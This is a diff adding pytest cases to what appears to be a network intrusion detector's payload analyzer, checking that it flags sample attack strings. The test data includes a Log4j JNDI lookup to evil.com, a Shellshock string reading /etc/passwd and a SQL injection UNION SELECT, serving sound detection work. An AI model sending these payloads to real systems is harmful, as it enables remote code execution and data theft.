@@ -5,6 +5,7 @@ import pytest
 
 from src.features.payload_analyzer import (
     extract_payload_features,
+    analyze_payload,
     PAYLOAD_FEATURE_NAMES,
     PATTERN_NAMES,
 )
@@ -86,3 +87,33 @@ def test_extended_feature_names_length():
     assert len(EXTENDED_FEATURE_NAMES) == 86
     assert EXTENDED_FEATURE_NAMES[:76] == FLOW_FEATURE_NAMES
     assert EXTENDED_FEATURE_NAMES[76:] == PAYLOAD_FEATURE_NAMES
+
+
+def test_log4j_detected():
+    vec = extract_payload_features([b"GET /${jndi:ldap://evil.com/a} HTTP/1.1"])
+    assert vec[4] == 1.0   # has_log4j
+    assert vec[6] >= 1.0
+
+
+def test_shellshock_detected():
+    vec = extract_payload_features([b"() { :;}; /bin/bash -c 'cat /etc/passwd'"])
+    assert vec[5] == 1.0   # has_shellshock
+    assert vec[6] >= 1.0
+
+
+def test_analyze_payload_with_raw_packet():
+    from unittest.mock import MagicMock
+    from scapy.all import Raw
+    pkt = MagicMock()
+    pkt.__contains__ = lambda self, layer: layer is Raw
+    pkt.__getitem__ = lambda self, layer: MagicMock(load=b"' UNION SELECT * FROM users--")
+    matches = analyze_payload(pkt)
+    assert "sql_injection" in matches
+
+
+def test_analyze_payload_no_raw():
+    from unittest.mock import MagicMock
+    from scapy.all import Raw
+    pkt = MagicMock()
+    pkt.__contains__ = lambda self, layer: False
+    assert analyze_payload(pkt) == []
